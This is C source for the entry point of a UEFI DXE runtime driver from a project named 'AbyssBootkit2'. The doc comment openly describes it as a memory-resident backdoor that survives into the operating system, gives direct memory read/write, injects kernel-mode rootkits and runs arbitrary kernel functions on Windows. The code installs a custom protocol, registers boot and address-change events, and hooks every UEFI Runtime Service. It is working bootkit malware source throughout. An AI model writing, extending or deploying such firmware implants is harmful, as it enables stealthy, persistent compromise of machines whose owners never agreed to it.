// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	DXE Runtime Driver
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiDriverEntryPoint.h
// Module entry point library for UEFI drivers, DXE Drivers, DXE Runtime Drivers, and DXE SMM Drivers.
#include <Library/UefiDriverEntryPoint.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiRuntimeServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Runtime Services Table. This library does not contain any functions or macros. It simply exports the global variable gRT that is a pointer to the EFI Runtime Services Table as defined in the UEFI Specification. The global variable gRT must be preinitialized to NULL. The library constructor must set gRT to point at the EFI Runtime Services Table so it is available at the module's entry point. Since there is overhead in initializing this global variable, only those modules that actually require access to the EFI Runtime Services Table should use this library. Only available to DXE and UEFI module types.
#include <Library/UefiRuntimeServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------
// START -> PROTOCOLS -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/LoadedImage.h
// UEFI 2.0 Loaded image protocol definition. Every EFI driver and application is passed an image handle when it is loaded. This image handle will contain a Loaded Image Protocol.
#include <Protocol/LoadedImage.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Globals/Globals00Protocol.h>
#include <Structures/Structures00Protocol.h>
#include <Functions/Hooks/Hooks01RuntimeServices.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          The entry point for the DXE Runtime Driver.
	@details        This function is executed when the DXE Runtime Driver is loaded by the UEFI firmware. It sets up persistence beyond ExitBootServices by registering for virtual address changes and installing a custom protocol interface. Additionally, it hooks all Runtime Services of the gRT table, allowing the driver to intercept UEFI calls even after the OS takes control. The driver behaves as a memory-resident backdoor: it enables direct read/write operations in memory, supports kernel-mode driver injection (loading a rootkit in memory), and allows execution of arbitrary kernel-level functions. This forms the foundation for post-boot implants and in-memory rootkit staging on Windows systems.


	@param[in]      ImageHandle             The firmware allocated handle for the EFI image.
	@param[in]      SystemTable             A pointer to the EFI System Table.


	@retval         EFI_SUCCESS             The entry point is executed successfully.
	@retval         other                   Some error occurs when executing this entry point.
**/
EFI_STATUS
EFIAPI
UefiMain (
	IN              EFI_HANDLE              ImageHandle,
	IN              EFI_SYSTEM_TABLE        *SystemTable
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_LOADED_IMAGE *LoadedImage = NULL;
	STRUCTURES_PROTOCOL_CUSTOMPROTOCOLDATA CustomProtocolInstance = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Get handle to image
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Get handle to image\r\n");

	// Queries a handle to determine if it supports a specified protocol. If the protocol is supported by the handle, it opens the protocol on behalf of the calling agent. This is an extended version of the EFI boot service EFI_BOOT_SERVICES.HandleProtocol().
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-openprotocol
	Status = gBS->OpenProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImage, ImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
	
	// Failed
	if (EFI_ERROR(Status)) 
	{
		Print(L"[ERROR] AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - gBS->OpenProtocol [gEfiLoadedImageProtocolGuid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Install protocol interface
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Install protocol interface\r\n");

	// Installs one or more protocol interfaces into the boot services environment.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-installmultipleprotocolinterfaces
	Status = gBS->InstallMultipleProtocolInterfaces(&ImageHandle, &GlobalsProtocol_CustomProtocolGuid, &CustomProtocolInstance, NULL);

	// Failed
	if (EFI_ERROR(Status)) 
	{
		Print(L"[ERROR] AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - gBS->InstallMultipleProtocolInterfaces failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Create global event for VirtualAddressMap
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Create global event for VirtualAddressMap\r\n");


	// Creates an event in a group.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-createeventex
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, HooksRuntimeServices_SetVirtualAddressMapEvent, NULL, &gEfiEventVirtualAddressChangeGuid, &Global_HooksRuntimeServices_VirtualAddressChangeEvent);

	// Failed
	if (EFI_ERROR(Status)) 
	{
		Print(L"[ERROR] AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - gBS->CreateEventEx [gEfiEventVirtualAddressChangeGuid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Create global event for ExitBootServices
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Create global event for ExitBootServices\r\n");

	// Creates an event in a group.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-createeventex
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, HooksRuntimeServices_ExitBootServicesEvent, NULL, &gEfiEventExitBootServicesGuid, &Global_HooksRuntimeServices_ExitBootServicesEvent);

	// Failed
	if (EFI_ERROR(Status)) 
	{
		Print(L"[ERROR] AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - gBS->CreateEventEx [gEfiEventExitBootServicesGuid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}



	// ---------------------------------------------------------------------------------------------------------------------
	// Hook runtime services
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Hook runtime services\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Hook SetVariable

	// Sets the value of a variable. This service can be used to create a new variable, modify the value of an existing variable, or to delete an existing variable.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#setvariable
	Global_HooksRuntimeServices_OriginalSetVariable =                 (EFI_SET_VARIABLE)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID**)&HooksRuntimeServices_HookedSetVariable);


	// ---------------------------------------------------------------------------------------------------------------------
	// Hook all the other runtime services functions

	// Returns the current time and date information, and the time-keeping capabilities of the hardware platform.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#gettime
	Global_HooksRuntimeServices_OriginalGetTime =                     (EFI_GET_TIME)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->GetTime, (VOID*)&HooksRuntimeServices_HookedGetTime);

	// Sets the current local time and date information.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#settime
	Global_HooksRuntimeServices_OriginalSetTime =                     (EFI_SET_TIME)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->SetTime, (VOID*)&HooksRuntimeServices_HookedSetTime);

	// Returns the current wakeup alarm clock setting.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#getwakeuptime
	Global_HooksRuntimeServices_OriginalGetWakeupTime =               (EFI_GET_WAKEUP_TIME)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->GetWakeupTime, (VOID*)&HooksRuntimeServices_HookedGetWakeupTime);

	// Sets the system wakeup alarm clock time.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#setwakeuptime
	Global_HooksRuntimeServices_OriginalSetWakeupTime =               (EFI_SET_WAKEUP_TIME)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->SetWakeupTime, (VOID*)&HooksRuntimeServices_HookedSetWakeupTime);

	// Changes the runtime addressing mode of EFI firmware from physical to virtual.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#setvirtualaddressmap
	Global_HooksRuntimeServices_OriginalSetVirtualAddressMap =        (EFI_SET_VIRTUAL_ADDRESS_MAP)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->SetVirtualAddressMap, (VOID*)&HooksRuntimeServices_HookedSetVirtualAddressMap);

	// Determines the new virtual address that is to be used on subsequent memory accesses.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#convertpointer
	Global_HooksRuntimeServices_OriginalConvertPointer =              (EFI_CONVERT_POINTER)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->ConvertPointer, (VOID*)&HooksRuntimeServices_HookedConvertPointer);

	// Returns the value of a variable.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#getvariable
	Global_HooksRuntimeServices_OriginalGetVariable =                 (EFI_GET_VARIABLE)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)&HooksRuntimeServices_HookedGetVariable);

	// Enumerates the current variable names.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#getnextvariablename
	Global_HooksRuntimeServices_OriginalGetNextVariableName =         (EFI_GET_NEXT_VARIABLE_NAME)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->GetNextVariableName, (VOID*)&HooksRuntimeServices_HookedGetNextVariableName);

	// Returns the next high 32 bits of the platform’s monotonic counter.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#getnexthighmonotoniccount
	Global_HooksRuntimeServices_OriginalGetNextHighMonotonicCount =   (EFI_GET_NEXT_HIGH_MONO_COUNT)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->GetNextHighMonotonicCount, (VOID*)&HooksRuntimeServices_HookedGetNextHighMonotonicCount);

	// Resets the entire platform. If the platform supports See ref:EFI_RESET_NOTIFICATION_PROTOCOL, then prior to completing the reset of the platform, all of the pending notifications must be called.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#resetsytem
	Global_HooksRuntimeServices_OriginalResetSystem =                 (EFI_RESET_SYSTEM)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->ResetSystem, (VOID*)&HooksRuntimeServices_HookedResetSystem);

	// Passes capsules to the firmware with both virtual and physical mapping. Depending on the intended consumption, the firmware may process the capsule immediately. If the payload should persist across a system reset, the reset value returned from EFI_QueryCapsuleCapabilities must be passed into Reset System and will cause the capsule to be processed by the firmware as part of the reset process.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#updatecapsule
	Global_HooksRuntimeServices_OriginalUpdateCapsule =               (EFI_UPDATE_CAPSULE)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->UpdateCapsule, (VOID*)&HooksRuntimeServices_HookedUpdateCapsule);

	// Returns if the capsule can be supported via UpdateCapsule().
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#querycapsulecapabilities
	Global_HooksRuntimeServices_OriginalQueryCapsuleCapabilities =    (EFI_QUERY_CAPSULE_CAPABILITIES)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->QueryCapsuleCapabilities, (VOID*)&HooksRuntimeServices_HookedQueryCapsuleCapabilities);

	// Returns information about the EFI variables.
	// https://uefi.org/specs/UEFI/2.11/08_Services_Runtime_Services.html#queryvariableinfo
	Global_HooksRuntimeServices_OriginalQueryVariableInfo =           (EFI_QUERY_VARIABLE_INFO)HooksRuntimeServices_SwapService(&gRT->Hdr, (VOID**)&gRT->QueryVariableInfo, (VOID*)&HooksRuntimeServices_HookedQueryVariableInfo); 


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	Print(L"[INFO]  AbyssBootkit2 -> [DXERuntimeDriver.c] (UefiMain) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
